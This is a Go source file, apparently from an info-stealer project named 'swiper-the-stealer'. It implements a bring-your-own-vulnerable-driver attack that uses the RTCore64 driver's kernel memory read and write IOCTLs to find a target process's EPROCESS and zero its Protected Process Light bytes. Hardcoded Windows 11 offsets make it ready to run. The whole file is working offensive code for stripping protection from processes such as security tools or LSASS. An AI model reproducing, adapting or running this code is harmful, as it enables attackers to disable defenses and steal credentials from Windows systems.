package byovd

import (
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/pkg/logger"
)

// Windows kernel structure offsets for Windows 11 23H2 (Build 2009+)
// Source: PPLKiller (RedCursorSecurityConsulting) + Vergilius Project
const (
	// EPROCESS offsets for Windows 11 23H2
	UniqueProcessIdOffset    = 0x0440 // VOID* UniqueProcessId (PID)
	ActiveProcessLinksOffset = 0x0448 // LIST_ENTRY ActiveProcessLinks
	TokenOffset              = 0x04B8 // EX_FAST_REF Token
	SignatureLevelOffset     = 0x0878 // UCHAR SignatureLevel (PPL protection)

	// KPROCESS offset (inside EPROCESS at +0x0)
	DirectoryTableBaseOffset = 0x0028 // ULONG64 DirectoryTableBase (CR3)
)

// RTCORE64_MEMORY_READ structure (48 bytes total)
// Source: PPLKiller, CheekyBlinder
type RTCORE64MemoryRead struct {
	Pad0     [8]byte  // Padding
	Address  uint64   // Physical or virtual address
	Pad1     [8]byte  // Padding
	ReadSize uint32   // Size to read (4 bytes max for primitive)
	Value    uint32   // Output value
	Pad3     [16]byte // Padding
}

// RTCORE64_MEMORY_WRITE structure (48 bytes total)
type RTCORE64MemoryWrite struct {
	Pad0      [8]byte  // Padding
	Address   uint64   // Physical or virtual address
	Pad1      [8]byte  // Padding
	WriteSize uint32   // Size to write (4 bytes max)
	Value     uint32   // Value to write
	Pad3      [16]byte // Padding
}

// PPLKiller handles PPL (Protected Process Light) removal using RTCore driver
type PPLKiller struct {
	rtcore *RTCoreExploit
	logger *logger.Logger
}

// NewPPLKiller creates a new PPL killer instance
func NewPPLKiller(rtcore *RTCoreExploit, logger *logger.Logger) *PPLKiller {
	return &PPLKiller{
		rtcore: rtcore,
		logger: logger,
	}
}

// RemovePPLProtection disables PPL protection on target process using EPROCESS linked list walk
// This is the PPLKiller method: Load ntoskrnl, find PsInitialSystemProcess, walk ActiveProcessLinks
func (pk *PPLKiller) RemovePPLProtection(targetPID uint32) error {
	pk.logger.Info("=== PPL PROTECTION REMOVAL (PPLKiller Method) ===")
	pk.logger.Infof("Target process PID: %d", targetPID)

	// Step 1: Get ntoskrnl.exe base address in kernel
	ntoskrnlBase, err := pk.getKernelBaseAddress()
	if err != nil {
		return fmt.Errorf("failed to get ntoskrnl base: %v", err)
	}
	pk.logger.Infof("✓ ntoskrnl.exe base address: 0x%016X", ntoskrnlBase)

	// Step 2: Find PsInitialSystemProcess offset using LoadLibrary trick
	psInitialSystemProcessOffset, err := pk.findPsInitialSystemProcessOffset()
	if err != nil {
		return fmt.Errorf("failed to find PsInitialSystemProcess offset: %v", err)
	}
	pk.logger.Infof("✓ PsInitialSystemProcess offset: 0x%016X", psInitialSystemProcessOffset)

	// Step 3: Read System process (PID 4) EPROCESS pointer
	systemEprocessAddr := ntoskrnlBase + psInitialSystemProcessOffset
	systemEprocess, err := pk.readMemoryQWORD(systemEprocessAddr)
	if err != nil {
		return fmt.Errorf("failed to read System EPROCESS: %v", err)
	}
	pk.logger.Infof("✓ System process EPROCESS: 0x%016X", systemEprocess)

	// Step 4: Walk ActiveProcessLinks to find target process
	targetEprocess, err := pk.walkActiveProcessLinks(systemEprocess, targetPID)
	if err != nil {
		return fmt.Errorf("failed to find target EPROCESS: %v", err)
	}
	pk.logger.Infof("✓ Target EPROCESS found: 0x%016X", targetEprocess)

	// Step 5: Patch SignatureLevel, SectionSignatureLevel, and Protection bytes
	err = pk.patchProtectionBytes(targetEprocess)
	if err != nil {
		return fmt.Errorf("failed to patch protection bytes: %v", err)
	}

	pk.logger.Infof("✓ PPL protection successfully removed from PID %d!", targetPID)
	pk.logger.Info("=== PPL REMOVAL COMPLETE ===")
	return nil
}

// getKernelBaseAddress retrieves ntoskrnl.exe base address using EnumDeviceDrivers
// First driver in the list is always ntoskrnl.exe
func (pk *PPLKiller) getKernelBaseAddress() (uint64, error) {
	pk.logger.Debug("Enumerating kernel device drivers...")

	// Load psapi.dll for EnumDeviceDrivers
	psapi := syscall.NewLazyDLL("psapi.dll")
	enumDeviceDrivers := psapi.NewProc("EnumDeviceDrivers")

	// First call to get required size
	var bytesNeeded uint32
	r1, _, _ := enumDeviceDrivers.Call(
		0, // NULL
		0, // 0 bytes
		uintptr(unsafe.Pointer(&bytesNeeded)),
	)

	if r1 == 0 {
		return 0, fmt.Errorf("EnumDeviceDrivers sizing call failed")
	}

	// Allocate buffer for driver base addresses
	driverCount := bytesNeeded / uint32(unsafe.Sizeof(uintptr(0)))
	drivers := make([]uintptr, driverCount)

	r1, _, err := enumDeviceDrivers.Call(
		uintptr(unsafe.Pointer(&drivers[0])),
		uintptr(bytesNeeded),
		uintptr(unsafe.Pointer(&bytesNeeded)),
	)

	if r1 == 0 {
		return 0, fmt.Errorf("EnumDeviceDrivers failed: %v", err)
	}

	if len(drivers) == 0 {
		return 0, fmt.Errorf("no device drivers found")
	}

	// First driver is always ntoskrnl.exe
	ntoskrnlBase := uint64(drivers[0])
	pk.logger.Debugf("Found %d kernel drivers, ntoskrnl.exe at: 0x%016X", len(drivers), ntoskrnlBase)

	return ntoskrnlBase, nil
}

// findPsInitialSystemProcessOffset finds the offset of PsInitialSystemProcess symbol
// Uses LoadLibrary trick: load ntoskrnl.exe in user mode and GetProcAddress
func (pk *PPLKiller) findPsInitialSystemProcessOffset() (uint64, error) {
	pk.logger.Debug("Finding PsInitialSystemProcess offset using LoadLibrary trick...")

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	loadLibrary := kernel32.NewProc("LoadLibraryW")
	getProcAddress := kernel32.NewProc("GetProcAddress")
	freeLibrary := kernel32.NewProc("FreeLibrary")

	// Load ntoskrnl.exe in user mode (gets mapped to same RVA offsets)
	ntoskrnlName, _ := syscall.UTF16PtrFromString("ntoskrnl.exe")
	hModule, _, err := loadLibrary.Call(uintptr(unsafe.Pointer(ntoskrnlName)))
	if hModule == 0 {
		return 0, fmt.Errorf("LoadLibrary(ntoskrnl.exe) failed: %v", err)
	}
	defer freeLibrary.Call(hModule)

	pk.logger.Debugf("ntoskrnl.exe loaded at user-mode address: 0x%016X", hModule)

	// Get address of PsInitialSystemProcess symbol
	symbolName := []byte("PsInitialSystemProcess\x00")
	symbolAddr, _, err := getProcAddress.Call(
		hModule,
		uintptr(unsafe.Pointer(&symbolName[0])),
	)

	if symbolAddr == 0 {
		return 0, fmt.Errorf("GetProcAddress(PsInitialSystemProcess) failed: %v", err)
	}

	// Calculate offset: symbol address - module base
	offset := uint64(symbolAddr) - uint64(hModule)
	pk.logger.Debugf("PsInitialSystemProcess symbol at: 0x%016X (offset: 0x%016X)", symbolAddr, offset)

	return offset, nil
}

// readMemoryQWORD reads 8 bytes (QWORD) from kernel memory using RTCore primitive
// Reads as two DWORD (4-byte) operations and combines them
func (pk *PPLKiller) readMemoryQWORD(address uint64) (uint64, error) {
	// Read low DWORD (bytes 0-3)
	lowDword, err := pk.readMemoryDWORD(address)
	if err != nil {
		return 0, fmt.Errorf("failed to read low DWORD: %v", err)
	}

	// Read high DWORD (bytes 4-7)
	highDword, err := pk.readMemoryDWORD(address + 4)
	if err != nil {
		return 0, fmt.Errorf("failed to read high DWORD: %v", err)
	}

	// Combine: high << 32 | low
	qword := (uint64(highDword) << 32) | uint64(lowDword)
	return qword, nil
}

// readMemoryDWORD reads 4 bytes (DWORD) from kernel memory using RTCore
func (pk *PPLKiller) readMemoryDWORD(address uint64) (uint32, error) {
	if pk.rtcore.deviceHandle == syscall.InvalidHandle {
		return 0, fmt.Errorf("RTCore device not initialized")
	}

	var request RTCORE64MemoryRead
	request.Address = address
	request.ReadSize = 4 // Read 4 bytes

	var bytesReturned uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	deviceIoControl := kernel32.NewProc("DeviceIoControl")

	r1, _, err := deviceIoControl.Call(
		uintptr(pk.rtcore.deviceHandle),
		uintptr(IOCTL_RTCORE_READ_PHYS_MEM),
		uintptr(unsafe.Pointer(&request)),
		unsafe.Sizeof(request),
		uintptr(unsafe.Pointer(&request)), // Output to same structure
		unsafe.Sizeof(request),
		uintptr(unsafe.Pointer(&bytesReturned)),
		0,
	)

	if r1 == 0 {
		return 0, fmt.Errorf("DeviceIoControl read failed: %v", err)
	}

	return request.Value, nil
}

// writeMemoryDWORD writes 4 bytes (DWORD) to kernel memory using RTCore
func (pk *PPLKiller) writeMemoryDWORD(address uint64, value uint32) error {
	if pk.rtcore.deviceHandle == syscall.InvalidHandle {
		return fmt.Errorf("RTCore device not initialized")
	}

	var request RTCORE64MemoryWrite
	request.Address = address
	request.WriteSize = 4 // Write 4 bytes
	request.Value = value

	var bytesReturned uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	deviceIoControl := kernel32.NewProc("DeviceIoControl")

	r1, _, err := deviceIoControl.Call(
		uintptr(pk.rtcore.deviceHandle),
		uintptr(IOCTL_RTCORE_WRITE_PHYS_MEM),
		uintptr(unsafe.Pointer(&request)),
		unsafe.Sizeof(request),
		uintptr(unsafe.Pointer(&request)),
		unsafe.Sizeof(request),
		uintptr(unsafe.Pointer(&bytesReturned)),
		0,
	)

	if r1 == 0 {
		return fmt.Errorf("DeviceIoControl write failed: %v", err)
	}

	pk.logger.Debugf("Wrote DWORD 0x%08X to address 0x%016X", value, address)
	return nil
}

// walkActiveProcessLinks walks the EPROCESS linked list to find target process
func (pk *PPLKiller) walkActiveProcessLinks(systemEprocess uint64, targetPID uint32) (uint64, error) {
	pk.logger.Debugf("Walking ActiveProcessLinks to find PID %d...", targetPID)

	// ActiveProcessLinks is at offset 0x448 in EPROCESS
	processHead := systemEprocess + ActiveProcessLinksOffset
	currentFlink := processHead

	visitedCount := 0
	maxIterations := 10000 // Safety limit

	for visitedCount < maxIterations {
		visitedCount++

		// Read Flink pointer (next process in list)
		nextFlink, err := pk.readMemoryQWORD(currentFlink)
		if err != nil {
			return 0, fmt.Errorf("failed to read Flink at 0x%016X: %v", currentFlink, err)
		}

		// Calculate EPROCESS address from LIST_ENTRY pointer
		// LIST_ENTRY.Flink points to the next LIST_ENTRY, not EPROCESS
		// EPROCESS = Flink - ActiveProcessLinksOffset
		currentEprocess := nextFlink - ActiveProcessLinksOffset

		// Read UniqueProcessId at offset 0x440
		pidAddr := currentEprocess + UniqueProcessIdOffset
		pid64, err := pk.readMemoryQWORD(pidAddr)
		if err != nil {
			pk.logger.Warnf("Failed to read PID at 0x%016X, skipping", pidAddr)
			currentFlink = nextFlink
			continue
		}

		pid := uint32(pid64)
		pk.logger.Debugf("Process %d: EPROCESS=0x%016X, PID=%d", visitedCount, currentEprocess, pid)

		// Check if this is our target
		if pid == targetPID {
			pk.logger.Infof("Found target PID %d at EPROCESS 0x%016X (visited %d processes)", targetPID, currentEprocess, visitedCount)
			return currentEprocess, nil
		}

		// Move to next process
		currentFlink = nextFlink

		// Check if we've looped back to the head (circular list)
		if nextFlink == processHead {
			break
		}
	}

	return 0, fmt.Errorf("target PID %d not found after visiting %d processes", targetPID, visitedCount)
}

// patchProtectionBytes patches SignatureLevel, SectionSignatureLevel, and Protection
// Writes 4 bytes of zeros starting at offset 0x878 to disable PPL
func (pk *PPLKiller) patchProtectionBytes(eprocessAddr uint64) error {
	pk.logger.Info("Patching PPL protection bytes...")

	protectionAddr := eprocessAddr + SignatureLevelOffset
	pk.logger.Debugf("Protection field address: 0x%016X", protectionAddr)

	// Read current protection values
	currentValue, err := pk.readMemoryDWORD(protectionAddr)
	if err != nil {
		return fmt.Errorf("failed to read current protection: %v", err)
	}

	pk.logger.Infof("Current protection bytes: 0x%08X", currentValue)

	// Check if already unprotected
	if currentValue == 0 {
		pk.logger.Info("Process already has no PPL protection (all zeros)")
		return nil
	}

	// Extract individual bytes for logging
	signatureLevel := byte(currentValue & 0xFF)
	sectionSignatureLevel := byte((currentValue >> 8) & 0xFF)
	protection := byte((currentValue >> 16) & 0xFF)

	pk.logger.Infof("SignatureLevel: 0x%02X, SectionSignatureLevel: 0x%02X, Protection: 0x%02X",
		signatureLevel, sectionSignatureLevel, protection)

	// Write 4 bytes of zeros to disable PPL
	pk.logger.Info("Writing 0x00000000 to disable PPL...")
	err = pk.writeMemoryDWORD(protectionAddr, 0x00000000)
	if err != nil {
		return fmt.Errorf("failed to patch protection: %v", err)
	}

	// Verify the patch
	verifyValue, err := pk.readMemoryDWORD(protectionAddr)
	if err != nil {
		return fmt.Errorf("failed to verify patch: %v", err)
	}

	if verifyValue != 0 {
		return fmt.Errorf("patch verification failed: expected 0x00000000, got 0x%08X", verifyValue)
	}

	pk.logger.Info("✓ PPL protection bytes successfully zeroed!")
	pk.logger.Info("✓ Process is now unprotected and accessible")

	return nil
}
